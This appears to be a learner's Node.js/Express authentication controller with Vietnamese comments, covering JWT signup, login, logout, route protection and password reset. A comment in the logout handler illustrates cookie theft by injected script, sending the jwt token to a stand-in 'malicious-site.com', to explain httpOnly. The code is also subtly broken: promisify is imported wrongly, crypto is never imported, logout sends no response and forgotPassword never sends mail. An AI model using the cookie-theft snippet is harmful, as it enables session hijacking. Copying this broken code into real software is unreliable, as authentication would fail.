const User = require('../model/userModel');
const AppError = require('../utils/appError');
const jwt = require('jsonwebtoken')
const promisify = require('util')


// CREATE TOKEN BASE ON USER ID
const signToken = (id) =>
    jwt.sign({ id }, process.env.JWT_SECRET, {
        expiresIn: process.env.JWT_EXPIRES_IN,
    });


const sendToken = (user, statusCode, res) => {
    const token = signToken(user.id)

    const cookieOptions = {
        expires: new Date(
            Date.now() + process.env.JWT_COOKIE_EXPIRES_IN * 24 * 60 * 60 * 1000 // Cookie quyết định token được lưu ở trình duyệt bao lâu.
        ),
        httpOnly: true, //  Hacker không thể đánh cắp token qua JS nếu chèn script độc.
        secure: true
    };

    res.cookie('jwt', token, cookieOptions);
    user.password = undefined;
    res.status(statusCode).json({
        status: "success",
        token,
        data: {
            user: user
        }
    })
}



exports.signup = async (req, res, next) => {
    const newUser = await User.create({
        name: req.body.name,
        email: req.body.email,
        password: req.body.password,
        passwordConfirm: req.body.passwordConfirm,
    })

    // console.log(newUser)
    // 201 - create new resource
    // res.status(201).json({
    //     status: 'success',
    //     data: {
    //         user: newUser
    //     }
    // })
    sendToken(newUser, 201, res)
}

exports.login = async (req, res, next) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return next(new AppError('Please provide email and password', 400))
    }
    const user = await User.findOne({ email: email }).select('+password')

    if (!user || !await (user.correctPassword(password, user.password))) {
        return next(new AppError('Incorrect email or Password', 401));

    }

    sendToken(user, 201, res)
}

exports.logout = (req, res) => {
    res.cookie('jwt', 'loggedout', {
        expires: new Date(Date.now() + 10 * 1000),
        httpOnly: true // Ngăn JS truy cập cookie → tăng bảo mật

        // TÁC DỤNG CỦA HTTP ONLY
        // Ví dụ hacker chèn script độc:
        // const token = document.cookie.match(/jwt=([^;]+)/)?.[1];
        // fetch('https://malicious-site.com/steal?token=' + token);
    })
}


exports.protect = async (req, res, next) => {
    var token;
    // postman =>  header
    // đảm bảo có authorization và có token sau bear
    if (req.headers.authorization && req.headers.authorization.startsWith('Bearer')) {
        token = req.headers.authorization.split(' ')[1];
        // web login => cookie
    } else if (req.cookies.jwt) {
        token = req.cookies.jwt
    }

    if (!token) {
        return next(new AppError('Please login', 401))
    }

    // VERIFICATION TOKENF
    // promisify(jwt.verify) => convert to Promise function
    // jwt.verify => verify token
    // lưu kết quả giải mã vào decoded
    const decoded = await promisify(jwt.verify)(token, process.env.JWT_SECRET)

    // CHECK IF USER STILL EXIST
    const currentUser = await User.findById(decoded.id)
    if (!currentUser) {
        return next(new AppError('The user belong to this token does not exist', 404))
    }

    if (currentUser.changePasswordAfter(decoded.iat)) {
        return next(new AppError('DA THAY DOI PASS, LOG IN AGAIN', 401))
    }

    req.user = currentUser;
    next()
}


exports.forgotPassword = async (req, res, next) => {
    // CHECK MAIL USER EXIST
    const user = await User.findOne({ email: req.body.email });
    if (!user) {
        return next(new AppError('there is no user with this email', 404))
    }

    // GENERATE RANDOM TOKEN
    const tokenPassword = user.generateRandomToken();

    // LƯU VÀO DB
    await user.save({ validateBeforeSave: false });
        // user.save() => lưu TẤT CẢ các thay đổi vào DB

    // SEND TO MAIL CLIENT

}

exports.resetPassword = async(req, res, next) => {

    // GET TOKEN
    const hashedToken = crypto
        .createHash('sha256')
        .update(req.params.token)
        .digest('hex');
    
    // TIM NGƯỜI DÙNG CÓ TOKEN GIỐNG NHƯ CÁI ĐÃ LƯU VÀ KIỂM TRA HẠN SỬ DỤNG
    const user = await User.findOne
    ({ passwordResetToken: hashedToken, passwordResetExpires : {$gt:Date.now()}})

    if (!user) {
        return next(new AppError('Token is invalid or expired', 404))
    }

    user.password = req.body.password;
    user.passwordConfirm = req.body.passwordConfirm;

    // token dùng 1 lần , nên cần phải xóa sau khi đổi
    user.passwordResetToken = undefined;
    user.passwordResetExpires = undefined;
    await user.save()
    // để tránh phải đăng nhập lại thì => 
    sendToken(user, 201, res)
}


exports.updatePassword = async (req, res, next) => {
    // GET USER FROM id 
    const user = await User.findById(req.user.id).select('+password')

    // CHECK CURRENT PASSWORD
    if (!(await user.correctPassword(req.body.passwordCurrent, user.password))) {
        return next(new AppError('PASSWORD current is WRONG', 401))
    }

    user.password = req.body.password;
    user.passwordConfirm = req.body.passwordConfirm;

    await user.save();

    sendToken(user, 201, res)
}